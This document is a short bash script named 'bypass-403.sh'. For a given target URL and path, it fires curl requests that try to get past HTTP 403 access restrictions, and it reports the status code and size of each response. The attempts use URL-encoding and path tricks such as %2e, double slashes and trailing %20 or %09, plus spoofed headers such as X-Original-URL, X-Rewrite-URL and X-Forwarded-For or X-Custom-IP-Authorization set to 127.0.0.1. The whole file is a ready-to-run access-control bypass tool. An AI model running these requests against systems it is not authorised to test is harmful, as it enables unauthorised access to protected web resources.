#! /bin/bash

# definitions
checkhelp(){
    echo "./bypass-403.sh https://target.com path"
    exit 0
}

if [ $# -eq 1 ]; then
    checkhelp "$@"
fi
# alias
curlrequest='curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}"'

$curlrequest $1/$2
echo "  --> ${1}/${2}"
$curlrequest $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
$curlrequest $1/$2/.
echo "  --> ${1}/${2}/."
$curlrequest $1//$2//
echo "  --> ${1}//${2}//"
$curlrequest $1/./$2/./
echo "  --> ${1}/./${2}/./"
$curlrequest -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
$curlrequest -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
$curlrequest -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
$curlrequest -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
$curlrequest -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
#updated
$curlrequest $1/$2%20
echo "  --> ${1}/${2}%20"
$curlrequest $1/$2%09
echo "  --> ${1}/${2}%09"
$curlrequest $1/$2?
echo "  --> ${1}/${2}?"
$curlrequest $1/$2.html
echo "  --> ${1}/${2}.html"
$curlrequest $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
$curlrequest $1/$2#
echo "  --> ${1}/${2}#"
